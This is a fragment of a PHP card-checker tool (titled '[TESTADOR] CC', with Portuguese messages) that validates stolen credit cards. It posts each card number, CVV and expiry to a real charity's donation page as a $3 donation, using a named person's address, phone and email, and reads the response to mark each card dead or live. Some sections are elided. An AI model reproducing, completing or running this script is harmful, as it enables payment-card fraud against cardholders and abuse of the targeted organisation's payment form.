...
?>
<html>
<link href="http://demo.thedevelovers.com/dashboard/kingadmin-v1.5/assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
	<link href="http://demo.thedevelovers.com/dashboard/kingadmin-v1.5/assets/css/font-awesome.min.css" rel="stylesheet" type="text/css">
	<link href="http://demo.thedevelovers.com/dashboard/kingadmin-v1.5/assets/css/main.css" rel="stylesheet" type="text/css">
	<link href="http://demo.thedevelovers.com/dashboard/kingadmin-v1.5/assets//css/my-custom-styles.css" rel="stylesheet" type="text/css">
	<link href="http://demo.thedevelovers.com/dashboard/kingadmin-v1.5/demo-style-switcher/assets/css/style-switcher.css" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="http://demo.thedevelovers.com/dashboard/kingadmin-v1.5/assets/ico/favicon.png">
        <title>[TESTADOR] CC</title>
    ...
    <body>
			...
			<div id="content">           
		   <center><form name="frm-CardCheck" method="post">
...
$ip5 = $ip1.".".$ip2.".".$ip3.".".$ip4;
   ...
   $ch = curl_init();
            ...
            curl_setopt($ch, CURLOPT_URL, 'https://www.toafoundation.org/donate.php');
            ...
            curl_setopt($ch, CURLOPT_REFERER, 'https://www.toafoundation.org/donate.php');
            curl_setopt($ch, CURLOPT_POSTFIELDS,"FirstName=York&LastName=Stegall&anonymous=true&Address=835+Hidden+Anchor+Impasse&City=Westover&State=VA&Zip=225928964&PhoneNumber=%28804%29+418-7539&EmailAddress=yorkste%40carmag.com&Amount=Other&AmountOther=3&ccFirstName=York&ccLastName=Stegall&ccType=M&ccNumber=$group_card&ccCSC=$group_cvv&ccExpirationMonth=$group_mes&ccExpirationYear=$group_ano&AckType=none&AckNameOfPerson=&AckFirstName=&AckLastName=&AckAddress=&AckCity=&AckState=TX&AckZip=&B1=Submit+Donation");
     $data = curl_exec($ch);
    curl_close($ch);
   
    
    if($data){
    if(preg_match("Your transaction has been rejected.", $data)) {
        echo "<div class='alert alert-danger' style='width: 80%;'> INFOCC: {$card}|{$mes}|{$ano}|{$cvv}  $   - DIE </div>";
    } elseif(preg_match("Your transaction has been rejected.", $data)) {
    ...
    $infos = $banco . '|'. $cartao12311. '|' .$cartaor. '|'.$cartao123. '|'.$cartao1231 ;
        ...
        die($data);echo "<div class='alert alert-danger' style='width: 80%;'> Check : {$card}|{$mes}|{$ano}|{$cvv}:  - Resposta : Codigo errado anta. </div>";
